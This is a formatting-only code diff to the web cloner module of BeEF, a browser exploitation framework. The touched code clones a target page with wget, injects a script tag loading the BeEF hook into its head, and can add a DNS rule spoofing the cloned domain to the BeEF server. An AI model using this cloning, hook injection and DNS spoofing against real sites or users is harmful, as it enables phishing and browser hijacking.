@@ -35,8 +35,9 @@ module BeEF
           # 2nd request. {"uri":"http://example.com", "mount":"/", "use_existing":"true"} <- serve the example.com_mod file
           #
           if use_existing.nil? || use_existing == false
-            begin                                                                                                                      #,"--background"
-              IO.popen(["wget", "#{url}","-c", "-k", "-O", "#{@cloned_pages_dir + output}", "-U", "#{user_agent}","--no-check-certificate"], 'r+') do |wget_io| end
+            begin #,"--background"
+              IO.popen(["wget", "#{url}", "-c", "-k", "-O", "#{@cloned_pages_dir + output}", "-U", "#{user_agent}", "--no-check-certificate"], 'r+') do |wget_io|
+              end
               success = true
             rescue => e
               print_error "Errors executing wget: #{e}"
@@ -108,7 +109,7 @@ module BeEF
             interceptor.set :frameable, frameable
             interceptor.set :beef_hook, @beef_hook
             interceptor.set :cloned_page, get_page_content(file_path)
-            interceptor.set :db_entry, persist_page(url,mount)
+            interceptor.set :db_entry, persist_page(url, mount)
 
             @http_server.mount("#{mount}", interceptor.new)
             print_info "Mounting cloned page on URL [#{mount}]"
@@ -117,7 +118,7 @@ module BeEF
             # Add a DNS record spoofing the address of the cloned webpage as the BeEF server
             if dns_spoof
               dns = BeEF::Extension::Dns::Server.instance
-              ip = Socket.ip_address_list.detect {|i| !(i.ipv4_loopback? || i.ipv6_loopback?)}
+              ip = Socket.ip_address_list.detect { |i| !(i.ipv4_loopback? || i.ipv6_loopback?) }
               domain = url.gsub(%r{^http://}, '')
 
               id = dns.add_rule(domain, Resolv::DNS::Resource::IN::A) do |transaction|
@@ -137,12 +138,11 @@ module BeEF
         private
         # Replace </head> with <BeEF_hook></head>
         def add_beef_hook(line)
-           if line.include?("</head>")
-             line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
-           elsif
-             line.gsub!("</HEAD>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</HEAD>")
-           end
-           line
+          if line.include?("</head>")
+            line.gsub!("</head>", "<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
+          elsif line.gsub!("</HEAD>", "<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</HEAD>")
+          end
+          line
         end
 
         private
@@ -176,7 +176,7 @@ module BeEF
         end
 
         def get_page_content(file_path)
-          file = File.open(file_path,'r')
+          file = File.open(file_path, 'r')
           cloned_page = file.read
           file.close
           cloned_page
